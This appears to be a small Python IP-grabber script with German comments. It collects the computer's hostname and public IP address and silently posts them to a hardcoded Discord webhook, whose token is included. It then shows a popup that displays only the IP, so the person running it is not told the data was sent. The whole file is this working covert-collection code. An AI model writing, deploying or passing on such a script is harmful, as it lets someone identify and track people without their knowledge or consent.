import requests
import socket
from tkinter import messagebox, Tk

# Hostname für Discord-Username
hostname = socket.gethostname()

# Öffentliche IP holen
try:
    wan_ip = requests.get("https://api.ipify.org").text
except:
    wan_ip = "Unbekannt"

# An Discord senden
webhook_url = "https://discord.com/api/webhooks/1383009673388757035/u3gHQ_PHaJqBVojDoCbDxYwKrpIXGuT7rPurWnGJg2Tz8NQXoAU6_XqDhjHEyN63W_KE"
payload = {
    "username": hostname,
    "content": f"Öffentliche IP: {wan_ip}"
}

try:
    requests.post(webhook_url, json=payload)
except Exception as e:
    print(f"Fehler beim Senden an Discord: {e}")

# Jetzt Popup anzeigen
root = Tk()
root.withdraw()
messagebox.showinfo("IP-Adresse", f"Öffentliche IP: {wan_ip}")
